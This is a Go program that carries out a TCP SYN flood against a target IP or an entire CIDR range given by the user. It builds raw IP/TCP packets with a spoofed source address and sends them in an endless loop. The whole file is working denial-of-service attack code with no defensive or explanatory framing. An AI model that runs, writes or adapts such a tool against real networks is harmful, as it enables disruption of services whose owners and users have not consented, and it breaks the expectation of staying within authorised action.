// synflood_userinput.go
package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strings"
	"syscall"
	"time"
)

// ---------- ANSI Colors ----------
const (
	Red    = "\033[31m"
	Green  = "\033[32m"
	Cyan   = "\033[36m"
	Reset  = "\033[0m"
	Bold   = "\033[1m"
)

func main() {
	rand.Seed(time.Now().UnixNano())
	reader := bufio.NewReader(os.Stdin)

	fmt.Print(Cyan + "Enter IP address or CIDR (e.g. 10.10.10.5 or 10.10.10.0/24): " + Reset)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	var targets []net.IP
	if strings.Contains(input, "/") {
		// CIDR block
		ip, ipnet, err := net.ParseCIDR(input)
		if err != nil {
			log.Fatalf(Red+"Invalid CIDR: %v"+Reset, err)
		}
		targets = expandCIDR(ip, ipnet)
	} else {
		ip := net.ParseIP(input)
		if ip == nil {
			log.Fatalf(Red+"Invalid IP address: %s"+Reset, input)
		}
		targets = append(targets, ip)
	}

	fmt.Print(Cyan + "Enter target port (e.g. 80): " + Reset)
	var port int
	fmt.Scanf("%d\n", &port)

	fmt.Println(Green + "[*] Starting SYN flood..." + Reset)

	srcIP := net.ParseIP("192.168.1.50").To4() // Spoofed IP
	conn, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		log.Fatalf(Red+"Socket error: %v"+Reset, err)
	}
	defer syscall.Close(conn)

	for {
		for _, dstIP := range targets {
			go func(dst net.IP) {
				srcPort := uint16(rand.Intn(65535-1024) + 1024)
				packet := buildPacket(srcIP, dst.To4(), srcPort, uint16(port))

				var sockaddr syscall.SockaddrInet4
				copy(sockaddr.Addr[:], dst.To4())
				sockaddr.Port = port

				err = syscall.Sendto(conn, packet, 0, &sockaddr)
				if err != nil {
					fmt.Println(Red + "[-] Failed to send packet to " + dst.String() + Reset)
				} else {
					fmt.Println(Green + "[+] Sent packet to " + dst.String() + Reset)
				}
			}(dstIP)
		}
		time.Sleep(100 * time.Millisecond) // Prevent full CPU usage
	}
}

func expandCIDR(ip net.IP, ipnet *net.IPNet) []net.IP {
	var ips []net.IP
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		ips = append(ips, net.IPv4(ip[0], ip[1], ip[2], ip[3]))
	}
	// remove network and broadcast
	if len(ips) > 2 {
		return ips[1 : len(ips)-1]
	}
	return ips
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func checksum(data []byte) uint16 {
	sum := 0
	for i := 0; i < len(data)-1; i += 2 {
		sum += int(data[i])<<8 + int(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += int(data[len(data)-1]) << 8
	}
	for (sum >> 16) > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return uint16(^sum)
}

func buildPacket(srcIP, dstIP net.IP, srcPort, dstPort uint16) []byte {
	ipHeader := make([]byte, 20)
	tcpHeader := make([]byte, 20)

	// IP header
	ipHeader[0] = 0x45
	ipHeader[1] = 0x00
	totalLen := 40
	binary.BigEndian.PutUint16(ipHeader[2:4], uint16(totalLen))
	binary.BigEndian.PutUint16(ipHeader[4:6], uint16(rand.Intn(65535)))
	ipHeader[6] = 0x00
	ipHeader[7] = 0x00
	ipHeader[8] = 64
	ipHeader[9] = syscall.IPPROTO_TCP
	copy(ipHeader[12:16], srcIP)
	copy(ipHeader[16:20], dstIP)
	binary.BigEndian.PutUint16(ipHeader[10:12], checksum(ipHeader))

	// TCP header
	binary.BigEndian.PutUint16(tcpHeader[0:2], srcPort)
	binary.BigEndian.PutUint16(tcpHeader[2:4], dstPort)
	binary.BigEndian.PutUint32(tcpHeader[4:8], rand.Uint32())
	tcpHeader[12] = 0x50
	tcpHeader[13] = 0x02 // SYN
	binary.BigEndian.PutUint16(tcpHeader[14:16], 65535)

	// TCP checksum
	psHeader := append([]byte{}, srcIP...)
	psHeader = append(psHeader, dstIP...)
	psHeader = append(psHeader, 0x00)
	psHeader = append(psHeader, syscall.IPPROTO_TCP)
	psHeader = append(psHeader, byte(len(tcpHeader)>>8), byte(len(tcpHeader)))
	chk := checksum(append(psHeader, tcpHeader...))
	binary.BigEndian.PutUint16(tcpHeader[16:18], chk)

	return append(ipHeader, tcpHeader...)
}
